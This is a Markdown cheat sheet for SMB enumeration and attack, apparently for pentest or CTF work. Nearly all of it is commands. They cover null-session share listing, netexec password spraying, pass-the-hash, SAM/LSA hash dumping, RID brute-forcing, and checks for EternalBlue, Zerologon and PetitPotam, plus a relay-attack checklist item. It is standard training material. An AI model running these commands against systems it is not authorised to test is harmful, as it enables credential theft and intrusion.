# SMB enumeration cheat sheet

Ports **139** (NetBIOS) / **445** (SMB). One of the richest anonymous-info
sources on Windows and Samba boxes.

## Quick wins (anonymous / null session)
```bash
# List shares
smbclient -L //10.10.10.10 -N
netexec smb 10.10.10.10 -u '' -p '' --shares
netexec smb 10.10.10.10 -u 'guest' -p '' --shares

# Full auto-enum (users, shares, groups, policy, os)
enum4linux-ng -A 10.10.10.10
```

## netexec (formerly crackmapexec) — the workhorse
```bash
# Host / OS / domain / signing
netexec smb 10.10.10.10

# Validate creds (add --local-auth for local accounts). '+' = valid, 'Pwn3d!' = admin
netexec smb 10.10.10.10 -u user -p 'Password1'
netexec smb 10.10.10.10 -u user -H <NTLM-hash>          # pass-the-hash

# Spray one password across a userlist
netexec smb 10.10.10.10 -u users.txt -p 'Winter2024!' --continue-on-success

# Enumerate with creds
netexec smb 10.10.10.10 -u user -p pass --shares --users --groups --pass-pol
netexec smb 10.10.10.10 -u user -p pass --sam --lsa       # dump hashes (needs admin)
netexec smb 10.10.10.10 -u user -p pass -M spider_plus    # index all readable files
```

## Mounting / browsing shares
```bash
smbclient //10.10.10.10/ShareName -U 'user%pass'
#   inside: ls, get file, put file, recurse ON, mget *, prompt OFF
mount -t cifs //10.10.10.10/Share /mnt/s -o username=user,password=pass
```

## RID cycling (users from a null session)
```bash
netexec smb 10.10.10.10 -u '' -p '' --rid-brute 5000
enum4linux-ng -R 10.10.10.10
```

## Vuln checks
```bash
nmap --script "smb-vuln-*" -p445 10.10.10.10       # MS17-010 (EternalBlue) etc.
netexec smb 10.10.10.10 -M zerologon
netexec smb 10.10.10.10 -M petitpotam
```

## Checklist
- [ ] Null + `guest` session for shares
- [ ] enum4linux-ng -A for users/policy
- [ ] Read every share you can (config files, scripts, `Users\` dirs)
- [ ] Password-reuse spray any creds you find across all hosts
- [ ] SMB signing disabled? → relay attacks (ntlmrelayx)
